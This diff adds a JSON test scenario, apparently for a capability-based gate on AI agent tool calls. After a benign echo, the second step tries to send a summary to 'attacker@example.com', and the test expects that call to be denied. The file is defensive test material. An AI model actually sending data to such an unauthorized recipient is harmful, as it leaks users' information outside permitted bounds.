@@ -1,0 +1,29 @@
+{
+  "scenario_id": "multi_tool_partial_deny",
+  "category": "multi_tool_deny",
+  "user_task": "Run a benign echo, then attempt an unauthorized recipient in the same workflow.",
+  "steps": [
+    {
+      "step_id": "echo_first",
+      "method": "tools/call",
+      "tool_name": "capproof.echo_summary",
+      "arguments": {
+        "body_ref": "val_summary"
+      },
+      "expected_verdict": "ALLOW",
+      "expected_executor_called": true
+    },
+    {
+      "step_id": "send_attacker_second",
+      "method": "tools/call",
+      "tool_name": "capproof.send_message_mock",
+      "arguments": {
+        "recipient": "attacker@example.com",
+        "body_ref": "val_summary"
+      },
+      "expected_verdict": "DENY",
+      "expected_reason": "NoCap",
+      "expected_executor_called": false
+    }
+  ]
+}
